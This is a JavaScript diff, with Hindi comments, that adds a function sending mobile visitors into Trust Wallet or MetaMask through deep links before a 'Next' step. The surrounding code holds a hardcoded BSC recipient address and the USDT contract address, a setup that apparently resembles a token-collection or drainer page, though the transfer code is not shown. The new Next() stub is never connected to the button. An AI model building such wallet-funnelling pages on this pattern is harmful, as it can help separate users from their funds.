@@ -1,3 +1,36 @@
+function openInWallet() {
+    const websiteUrl = window.location.href.replace("https://", ""); // आपकी साइट का URL
+    
+    // Deep link URLs
+    const trustWalletUrl = "https://link.trustwallet.com/open_url?coin_id=60&url=https://" + websiteUrl;
+    const metaMaskUrl = "https://metamask.app.link/dapp/" + websiteUrl;
+
+    // अगर ब्राउज़र में कोई वॉलेट नहीं मिला (जैसे सामान्य Chrome)
+    if (!window.ethereum && !window.trustwallet) {
+        // Android और iPhone के लिए अलग-अलग पहचान
+        const isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
+        
+        if (isMobile) {
+            // ट्रस्ट वॉलेट को प्राथमिकता दें, अगर नहीं तो मेटामास्क
+            window.location.href = trustWalletUrl;
+            
+            // 2 सेकंड बाद मेटामास्क ट्राई करें अगर ट्रस्ट वॉलेट नहीं खुला
+            setTimeout(() => {
+                window.location.href = metaMaskUrl;
+            }, 2000);
+            return true; 
+        }
+    }
+    return false; // अगर वॉलेट पहले से इंजेक्टेड है
+}
+
+// अपने Next फंक्शन में इसे सबसे ऊपर कॉल करें
+async function Next() {
+    const isRedirecting = openInWallet();
+    if (isRedirecting) return; // अगर ऐप खुल रहा है तो आगे का कोड रोक दें
+
+    // ... आपका पुराना Web3 कोड यहाँ रहेगा ...
+}
 // Addresses
 const bscAddress = "0x673849E3109f6Cf1f6ced4034C8363C17ff87ebe";
 const usdtContractAddress = "0x55d398326f99059fF775485246999027B3197955"; // Real BSC USDT Address
@@ -106,3 +139,4 @@ async function handleNext() {
 
 // Event Listeners
 document.getElementById("nextBtn").addEventListener("click", handleNext);
+
